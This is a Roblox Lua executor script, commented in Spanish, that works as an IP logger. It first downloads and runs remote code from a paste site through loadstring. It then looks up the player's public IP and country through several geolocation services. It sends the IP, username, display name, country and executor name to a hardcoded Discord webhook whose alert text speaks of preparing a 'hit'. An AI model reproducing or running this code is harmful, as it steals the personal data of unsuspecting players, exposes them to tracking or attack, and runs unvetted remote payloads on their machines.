local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ====================================
-- 1️⃣ Ejecutar loadstring primero
-- ====================================
pcall(function()
    loadstring(game:HttpGet("https://paste.debian.net/plainh/28c28085/", true))()
end)

-- ====================================
-- 2️⃣ Tabla completa de países con emoji manual
-- ====================================
local CountryEmoji = {
    ["Afganistán"]="Afganistán 🇦🇫", ["Albania"]="Albania 🇦🇱", ["Argelia"]="Argelia 🇩🇿",
    ["Samoa Americana"]="Samoa Americana 🇦🇸", ["Andorra"]="Andorra 🇦🇩", ["Angola"]="Angola 🇦🇴",
    ["Anguila"]="Anguila 🇦🇮", ["Antártida"]="Antártida 🇦🇶", ["Antigua y Barbuda"]="Antigua y Barbuda 🇦🇬",
    ["Argentina"]="Argentina 🇦🇷", ["Armenia"]="Armenia 🇦🇲", ["Aruba"]="Aruba 🇦🇼",
    ["Australia"]="Australia 🇦🇺", ["Austria"]="Austria 🇦🇹", ["Azerbaiyán"]="Azerbaiyán 🇦🇿",
    ["Bahamas"]="Bahamas 🇧🇸", ["Baréin"]="Baréin 🇧🇭", ["Bangladesh"]="Bangladesh 🇧🇩",
    ["Barbados"]="Barbados 🇧🇧", ["Bielorrusia"]="Bielorrusia 🇧🇾", ["Bélgica"]="Bélgica 🇧🇪",
    ["Belice"]="Belice 🇧🇿", ["Benín"]="Benín 🇧🇯", ["Bermudas"]="Bermudas 🇧🇲",
    ["Bután"]="Bután 🇧🇹", ["Bolivia"]="Bolivia 🇧🇴", ["Bosnia y Herzegovina"]="Bosnia y Herzegovina 🇧🇦",
    ["Botsuana"]="Botsuana 🇧🇼", ["Brasil"]="Brasil 🇧🇷", ["Canadá"]="Canadá 🇨🇦",
    ["Chile"]="Chile 🇨🇱", ["China"]="China 🇨🇳", ["Colombia"]="Colombia 🇨🇴",
    ["Costa Rica"]="Costa Rica 🇨🇷", ["Croacia"]="Croacia 🇭🇷", ["Cuba"]="Cuba 🇨🇺",
    ["Curazao"]="Curazao 🇨🇼", ["Chipre"]="Chipre 🇨🇾", ["Chequia"]="Chequia 🇨🇿",
    ["Dinamarca"]="Dinamarca 🇩🇰", ["Yibuti"]="Yibuti 🇩🇯", ["Dominica"]="Dominica 🇩🇲",
    ["República Dominicana"]="República Dominicana 🇩🇴", ["Ecuador"]="Ecuador 🇪🇨",
    ["Egipto"]="Egipto 🇪🇬", ["El Salvador"]="El Salvador 🇸🇻", ["Emiratos Árabes Unidos"]="Emiratos Árabes Unidos 🇦🇪",
    ["Eritrea"]="Eritrea 🇪🇷", ["Estonia"]="Estonia 🇪🇪", ["Esuatini"]="Esuatini 🇸🇿",
    ["Etiopía"]="Etiopía 🇪🇹", ["Islas Malvinas"]="Islas Malvinas 🇫🇰", ["Islas Feroe"]="Islas Feroe 🇫🇴",
    ["Fiyi"]="Fiyi 🇫🇯", ["Finlandia"]="Finlandia 🇫🇮", ["Francia"]="Francia 🇫🇷",
    ["Gabón"]="Gabón 🇬🇦", ["Gambia"]="Gambia 🇬🇲", ["Georgia"]="Georgia 🇬🇪",
    ["Alemania"]="Alemania 🇩🇪", ["Ghana"]="Ghana 🇬🇭", ["Gibraltar"]="Gibraltar 🇬🇮",
    ["Grecia"]="Grecia 🇬🇷", ["Groenlandia"]="Groenlandia 🇬🇱", ["Granada"]="Granada 🇬🇩",
    ["Guadalupe"]="Guadalupe 🇬🇵", ["Guam"]="Guam 🇬🇺", ["Guatemala"]="Guatemala 🇬🇹",
    ["Guernesey"]="Guernesey 🇬🇬", ["Guinea"]="Guinea 🇬🇳", ["Guinea-Bisáu"]="Guinea-Bisáu 🇬🇼",
    ["Guyana"]="Guyana 🇬🇾", ["Haití"]="Haití 🇭🇹", ["Honduras"]="Honduras 🇭🇳",
    ["Hong Kong"]="Hong Kong 🇭🇰", ["Hungría"]="Hungría 🇭🇺", ["Islandia"]="Islandia 🇮🇸",
    ["India"]="India 🇮🇳", ["Indonesia"]="Indonesia 🇮🇩", ["Irán"]="Irán 🇮🇷",
    ["Irak"]="Irak 🇮🇶", ["Irlanda"]="Irlanda 🇮🇪", ["Isla de Man"]="Isla de Man 🇮🇲",
    ["Israel"]="Israel 🇮🇱", ["Italia"]="Italia 🇮🇹", ["Jamaica"]="Jamaica 🇯🇲",
    ["Japón"]="Japón 🇯🇵", ["Jersey"]="Jersey 🇯🇪", ["Jordania"]="Jordania 🇯🇴",
    ["Kazajistán"]="Kazajistán 🇰🇿", ["Kenia"]="Kenia 🇰🇪", ["Kiribati"]="Kiribati 🇰🇮",
    ["Kuwait"]="Kuwait 🇰🇼", ["Kirguistán"]="Kirguistán 🇰🇬", ["Laos"]="Laos 🇱🇦",
    ["Letonia"]="Letonia 🇱🇻", ["Líbano"]="Líbano 🇱🇧", ["Lesoto"]="Lesoto 🇱🇸",
    ["Liberia"]="Liberia 🇱🇷", ["Libia"]="Libia 🇱🇾", ["Liechtenstein"]="Liechtenstein 🇱🇮",
    ["Lituania"]="Lituania 🇱🇹", ["Luxemburgo"]="Luxemburgo 🇱🇺", ["Macao"]="Macao 🇲🇴",
    ["Madagascar"]="Madagascar 🇲🇬", ["Malaui"]="Malaui 🇲🇼", ["Malasia"]="Malasia 🇲🇾",
    ["Maldivas"]="Maldivas 🇲🇻", ["Mali"]="Mali 🇲🇱", ["Malta"]="Malta 🇲🇹",
    ["Islas Marshall"]="Islas Marshall 🇲🇭", ["Martinica"]="Martinica 🇲🇶", ["Mauritania"]="Mauritania 🇲🇷",
    ["Mauricio"]="Mauricio 🇲🇺", ["México"]="México 🇲🇽", ["Micronesia"]="Micronesia 🇫🇲",
    ["Moldavia"]="Moldavia 🇲🇩", ["Mónaco"]="Mónaco 🇲🇨", ["Mongolia"]="Mongolia 🇲🇳",
    ["Montenegro"]="Montenegro 🇲🇪", ["Montserrat"]="Montserrat 🇲🇸", ["Marruecos"]="Marruecos 🇲🇦",
    ["Mozambique"]="Mozambique 🇲🇿", ["Birmania"]="Birmania 🇲🇲", ["Namibia"]="Namibia 🇳🇦",
    ["Nauru"]="Nauru 🇳🇷", ["Nepal"]="Nepal 🇳🇵", ["Países Bajos"]="Países Bajos 🇳🇱",
    ["Nueva Caledonia"]="Nueva Caledonia 🇳🇨", ["Nueva Zelanda"]="Nueva Zelanda 🇳🇿",
    ["Nicaragua"]="Nicaragua 🇳🇮", ["Níger"]="Níger 🇳🇪", ["Nigeria"]="Nigeria 🇳🇬",
    ["Niue"]="Niue 🇳🇺", ["Corea del Norte"]="Corea del Norte 🇰🇵", ["Macedonia del Norte"]="Macedonia del Norte 🇲🇰",
    ["Islas Marianas del Norte"]="Islas Marianas del Norte 🇲🇵", ["Noruega"]="Noruega 🇳🇴", ["Omán"]="Omán 🇴🇲",
    ["Pakistán"]="Pakistán 🇵🇰", ["Palaos"]="Palaos 🇵🇼", ["Palestina"]="Palestina 🇵🇸",
    ["Panamá"]="Panamá 🇵🇦", ["Papúa Nueva Guinea"]="Papúa Nueva Guinea 🇵🇬", ["Paraguay"]="Paraguay 🇵🇾",
    ["Perú"]="Perú 🇵🇪", ["Filipinas"]="Filipinas 🇵🇭", ["Islas Pitcairn"]="Islas Pitcairn 🇵🇳",
    ["Polonia"]="Polonia 🇵🇱", ["Portugal"]="Portugal 🇵🇹", ["Puerto Rico"]="Puerto Rico 🇵🇷",
    ["Catar"]="Catar 🇶🇦", ["Rumanía"]="Rumanía 🇷🇴", ["Rusia"]="Rusia 🇷🇺",
    ["Ruanda"]="Ruanda 🇷🇼", ["Reunión"]="Reunión 🇷🇪", ["San Bartolomé"]="San Bartolomé 🇧🇱",
    ["Santa Elena"]="Santa Elena 🇸🇭", ["San Cristóbal y Nieves"]="San Cristóbal y Nieves 🇰🇳",
    ["Santa Lucía"]="Santa Lucía 🇱🇨", ["San Martín"]="San Martín 🇲🇫", ["San Pedro y Miquelón"]="San Pedro y Miquelón 🇵🇲",
    ["San Vicente y Granadinas"]="San Vicente y Granadinas 🇻🇨", ["Samoa"]="Samoa 🇼🇸", ["San Marino"]="San Marino 🇸🇲",
    ["Santo Tomé y Príncipe"]="Santo Tomé y Príncipe 🇸🇹", ["Arabia Saudita"]="Arabia Saudita 🇸🇦", ["Senegal"]="Senegal 🇸🇳",
    ["Serbia"]="Serbia 🇷🇸", ["Seychelles"]="Seychelles 🇸🇨", ["Sierra Leona"]="Sierra Leona 🇸🇱",
    ["Singapur"]="Singapur 🇸🇬", ["Sint Maarten"]="Sint Maarten 🇸🇽", ["Eslovaquia"]="Eslovaquia 🇸🇰",
    ["Eslovenia"]="Eslovenia 🇸🇮", ["Islas Salomón"]="Islas Salomón 🇸🇧", ["Somalia"]="Somalia 🇸🇴",
    ["Sudáfrica"]="Sudáfrica 🇿🇦", ["Corea del Sur"]="Corea del Sur 🇰🇷", ["Sudán del Sur"]="Sudán del Sur 🇸🇸",
    ["España"]="España 🇪🇸", ["Sri Lanka"]="Sri Lanka 🇱🇰", ["Sudán"]="Sudán 🇸🇩",
    ["Surinam"]="Surinam 🇸🇷", ["Suecia"]="Suecia 🇸🇪", ["Suiza"]="Suiza 🇨🇭",
    ["Siria"]="Siria 🇸🇾", ["Taiwán"]="Taiwán 🇹🇼", ["Tayikistán"]="Tayikistán 🇹🇯",
    ["Tanzania"]="Tanzania 🇹🇿", ["Tailandia"]="Tailandia 🇹🇭", ["Timor-Leste"]="Timor-Leste 🇹🇱",
    ["Togo"]="Togo 🇹🇬", ["Tokelau"]="Tokelau 🇹🇰", ["Tonga"]="Tonga 🇹🇴",
    ["Trinidad y Tobago"]="Trinidad y Tobago 🇹🇹", ["Túnez"]="Túnez 🇹🇳", ["Turquía"]="Turquía 🇹🇷",
    ["Turkmenistán"]="Turkmenistán 🇹🇲", ["Islas Turcas y Caicos"]="Islas Turcas y Caicos 🇹🇨", ["Tuvalu"]="Tuvalu 🇹🇻",
    ["Uganda"]="Uganda 🇺🇬", ["Ucrania"]="Ucrania 🇺🇦", ["Reino Unido"]="Reino Unido 🇬🇧",
    ["Estados Unidos"]="Estados Unidos 🇺🇸", ["Uruguay"]="Uruguay 🇺🇾", ["Uzbekistán"]="Uzbekistán 🇺🇿",
    ["Vanuatu"]="Vanuatu 🇻🇺", ["Ciudad del Vaticano"]="Ciudad del Vaticano 🇻🇦", ["Venezuela"]="Venezuela 🇻🇪",
    ["Vietnam"]="Vietnam 🇻🇳", ["Wallis y Futuna"]="Wallis y Futuna 🇼🇫", ["Sahara Occidental"]="Sahara Occidental 🇪🇭",
    ["Yemen"]="Yemen 🇾🇪", ["Zambia"]="Zambia 🇿🇲", ["Zimbabue"]="Zimbabue 🇿🇼"
}

-- ====================================
-- 3️⃣ Detectar país e IP desde IP usando la tabla manual
-- ====================================
local function detectCountryAndIP()
    local country, ip = "Desconocido", "Desconocido"
    local services = {
        "https://ipapi.co/json",
        "https://ipinfo.io/json",
        "https://ipwhois.app/json/",
        "http://ip-api.com/json",
        "https://geolocation-db.com/json/"
    }
    for _, url in ipairs(services) do
        local success, response = pcall(function()
            return (request or http_request or syn.request)({Url=url, Method="GET"}).Body
        end)
        if success and response then
            local data = HttpService:JSONDecode(response)
            if data then
                country = data.country_name or data.country or country
                ip = data.ip or ip
            end
        end
        if country ~= "Desconocido" then break end
    end
    return CountryEmoji[country] or country.." 🏳️", ip
end

local countryDisplay, userIP = detectCountryAndIP()

-- ====================================
-- 4️⃣ Enviar webhook
-- ====================================
if getgenv().WebhookEnviado then return end
getgenv().WebhookEnviado = true

local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
local mainImageURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
local executorName = identifyexecutor and identifyexecutor() or "Desconocido"

local data = {
    ["username"] = "⚠️ ALERTA VIP",
    ["avatar_url"] = avatarUrl,
    ["content"] = "**⚠️ Ejecución detectada, prepárate para recoger el hit 🚨**",
    ["embeds"] = {{
        ["title"] = "🎮 Alerta de ejecución",
        ["description"] = "Información capturada automáticamente con portada en la esquina:",
        ["color"] = 16729344,
        ["thumbnail"] = {["url"] = mainImageURL},
        ["fields"] = {
            {["name"]="IP☠️:", ["value"]=userIP, ["inline"]=true},
            {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
            {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
            {["name"]="🌎 País", ["value"]=countryDisplay, ["inline"]=true},
            {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
            {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
            {["name"]="💥 Estado", ["value"]="Preparando todo para el hit, mantente atento!", ["inline"]=false}
        },
        ["footer"] = {["text"] = "Sistema de ejecución • " .. os.date("%d/%m/%Y")}
    }}
}

local FinalData = HttpService:JSONEncode(data)
local req = request or http_request or syn.request
if req then
    pcall(function()
        req({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = FinalData
        })
    end)
end
